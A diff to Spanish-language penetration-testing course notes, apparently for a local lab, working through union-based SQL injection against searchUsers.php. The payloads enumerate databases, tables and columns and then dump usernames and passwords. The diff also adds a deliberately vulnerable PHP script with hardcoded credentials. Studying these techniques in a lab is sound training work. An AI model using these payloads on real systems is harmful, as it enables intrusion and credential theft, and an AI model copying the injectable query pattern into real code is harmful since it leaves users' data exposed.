@@ -2215,8 +2215,66 @@ localhost/searchUsers.php?id=16859753' union select 1-- - # Esto nos devuelve el
 localhost/searchUsers.php?id=16859753' union select "Hola"-- - # Esto nos devuelve el hola
 # Con el siguiente comando mostramos la base de datos en uso
 localhost/searchUsers.php?id=16859753' union select database()-- -
+
 # Aquí nos muestra las bases de datos contenidas, aunque no siempre las muestra todas
 localhost/searchUsers.php?id=16859753' union select schema_name from information_schema.schemata-- -
+
+# Aquí listamos con limit una por una de las bases de datos contenidas
+localhost/searchUser.php?id=16859753' union select schema_name from information_schema.schemata limit 0,1-- -
+
+localhost/searchUser.php?id=16859753' union select schema_name from information_schema.schemata limit 1,1-- -
+
+localhost/searchUser.php?id=16859753' union select schema_name from information_schema.schemata limit 2,1-- -
+
+# Ahora agruparemos las bases de datos en un solo comando
+localhost/searchUser.php?id=16859753' union select group_concat(schema_name) from information_schema.schemata limit 2,1-- -
+
+# Omito toda la parte desde id
+# Buscamos las tablas que pueden estar en la base de datos
+union select group_concat(table_name) from information_schema.tables where table_schema='Hack4u"-- -
+
+union select group_concat(column_name) from information_schema.columns where table_schema="Hack4u" and table_name="users"-- -
+
+union select group_concat(username) from Hack4u.users-- -
+
+union select group_concat(password) from Hack4u.users-- -
+
+# 'Ahora unimos dos columnas para ver correspondencia
+union select group_concat(username,':',password) from users-- -
+
+# S4vitar nos recomienda meter los dos puntos en hexadecimal
+union select group_concat(username,0x3a,password) from users-- -
+
+
+# S4vitar nos comenta que esto sucede porque vemos el error
+# Sin embargo hay momentos en los que el desarrollador no nos mostrará los errores
+# Modificamos el archivo searchUsers.php
+# ----- searchUsers.php inicio
+<?
+    $server = "localhost";
+    $username = "s4vitar";
+    $password = "s4vitar456";
+    $database = "Hack4u";
+
+    # Conexión a la base de datos
+    $conn = new mysqli($server, $username, $password, $database);
+
+    $id = $_GET['id'];
+    
+    $data = mysqli_query($conn, "select username from users where id = '$id'") or die(mysqli_error($conn));
+
+    $response = mysqli_fetch_array($data);
+
+    echo $response['username'];
+
+?>
+# ----- searchUsers.php fin
+
+
+
+
+
+
 
 
 
